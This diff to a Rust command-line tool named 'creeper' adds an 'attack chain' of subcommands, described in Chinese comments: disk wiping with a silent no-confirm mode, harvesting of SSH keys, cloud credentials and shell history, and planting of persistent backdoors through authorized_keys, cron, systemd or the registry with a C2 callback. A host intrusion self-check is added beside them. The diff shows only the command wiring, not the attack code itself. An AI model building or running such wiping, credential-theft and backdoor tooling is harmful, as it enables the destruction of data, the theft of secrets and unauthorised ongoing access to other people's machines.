@@ -6,6 +6,7 @@ use config::Config;
 use crate::attack::Creeper;
 
 mod attack;
+mod attack_chain;
 mod backup;
 mod bot;
 mod bot_connect;
@@ -14,6 +15,7 @@ mod config;
 mod crawl;
 mod discover;
 mod host;
+mod hids;
 mod tasks;
 mod entity_location;
 mod factory;
@@ -427,6 +429,103 @@ enum Commands {
         /// Output directory for the backup .zip (default: data_dir/backups/)
         #[arg(short, long)]
         output: Option<String>,
+    },
+
+    /// 攻击链模块 1：自毁/抹盘（wipe）——危险操作，默认 dry-run 仅打印不执行。
+    ///
+    /// 目标平台：Linux（dd/shred/rm -rf）或 Windows（diskpart/Clear-Disk/rd）。
+    /// 需要 `--execute` 标志并确认后才能实际执行。
+    ///
+    /// 示例：
+    ///   creeper wipe --platform linux --level mbr              # dry-run 打印计划
+    ///   creeper wipe --platform linux --level full --execute   # 实际执行完整抹盘
+    ///   creeper wipe --platform windows --level shred -x -y    # 静默执行（不确认）
+    #[command(visible_alias = "w")]
+    Wipe {
+        /// 目标平台: linux, windows, auto（自动检测）
+        #[arg(short, long, default_value = "auto")]
+        platform: String,
+
+        /// 实际执行（默认 dry-run 只打印不执行）
+        #[arg(short = 'x', long)]
+        execute: bool,
+
+        /// 跳过确认提示（静默模式，仅与 --execute 联用）
+        #[arg(short = 'y', long)]
+        yes: bool,
+
+        /// 抹盘级别: mbr（清分区表）, shred（覆写）, full（完整破坏）
+        #[arg(short = 'l', long, default_value = "mbr")]
+        level: String,
+    },
+
+    /// 攻击链模块 2：敏感文件/凭据回收（harvest）——只读收集，无破坏性。
+    ///
+    /// 收集 SSH 密钥、云凭据（AWS/GCloud/Azure/Docker/K8s）、
+    /// shell 历史、系统配置等敏感文件。
+    ///
+    /// 示例：
+    ///   creeper harvest --platform linux                      # 打印到 stdout
+    ///   creeper harvest --platform linux --output ./report    # 保存到目录
+    ///   creeper harvest --platform windows --output ./dump.zip --zip  # 打包 zip
+    #[command(visible_alias = "h")]
+    Harvest {
+        /// 目标平台: linux, windows, auto（自动检测）
+        #[arg(short, long, default_value = "auto")]
+        platform: String,
+
+        /// 输出目录或文件路径（默认打印到 stdout）
+        #[arg(short = 'o', long)]
+        output: Option<String>,
+
+        /// 打包为 zip（含 JSON 报告 + 收集到的文件）
+        #[arg(short = 'z', long)]
+        zip: bool,
+    },
+
+    /// 攻击链模块 3：投放持久化后门（persist）——默认 dry-run。
+    ///
+    /// 支持 Linux（SSH key / crontab / systemd / bashrc）和
+    /// Windows（SSH key / schtasks / registry Run / Startup）。
+    ///
+    /// 示例：
+    ///   creeper persist --ssh-key "ssh-rsa AAAA..."                               # dry-run
+    ///   creeper persist --ssh-key "ssh-rsa AAAA..." --callback "http://c2:8080"   # dry-run
+    ///   creeper persist --ssh-key "ssh-rsa AAAA..." --execute                     # 实际执行
+    #[command(visible_alias = "p")]
+    Persist {
+        /// 目标平台: linux, windows, auto（自动检测）
+        #[arg(short, long, default_value = "auto")]
+        platform: String,
+
+        /// SSH 公钥内容（用于 authorized_keys 后门）
+        #[arg(short = 'k', long)]
+        ssh_key: Option<String>,
+
+        /// 回调地址（C2 或反弹 shell 地址）
+        #[arg(short = 'c', long)]
+        callback: Option<String>,
+
+        /// 实际执行（默认 dry-run 只打印不执行）
+        #[arg(short = 'x', long)]
+        execute: bool,
+    },
+
+    /// 主机入侵指标自检（HIDS）——只读安全检查
+    ///
+    /// 在自己管理的机器上检查以下入侵指标：
+    ///   - SSH authorized_keys 异常
+    ///   - Shell history 清空/可疑命令
+    ///   - Systemd 服务异常 / cron 任务
+    ///   - /dev/shm 可执行文件检测
+    ///   - 云凭据泄漏检测
+    ///   - 启动脚本后门检测
+    ///   - 弱口令自检
+    #[command(visible_alias = "hids")]
+    HidsCheck {
+        /// 输出 JSON 格式（便于程序处理）
+        #[arg(short, long)]
+        json: bool,
     },
 }
 
@@ -1414,6 +1513,27 @@ async fn main() -> anyhow::Result<()> {
 
         Some(Commands::Backup { remote, output }) => {
             backup::run_backup(remote.as_deref(), output.as_deref()).await?;
+        }
+
+        Some(Commands::Wipe { platform, execute, yes, level }) => {
+            attack_chain::run_wipe(&platform, &level, execute, yes);
+        }
+
+        Some(Commands::Harvest { platform, output, zip }) => {
+            attack_chain::run_harvest(&platform, output.as_deref(), zip);
+        }
+
+        Some(Commands::Persist { platform, ssh_key, callback, execute }) => {
+            attack_chain::run_persist(&platform, ssh_key.as_deref(), callback.as_deref(), execute);
+        }
+
+        Some(Commands::HidsCheck { json }) => {
+            let report = hids::run_all();
+            if json {
+                println!("{}", serde_json::to_string_pretty(&report)?);
+            } else {
+                hids::print_report(&report);
+            }
         }
 
         None => {
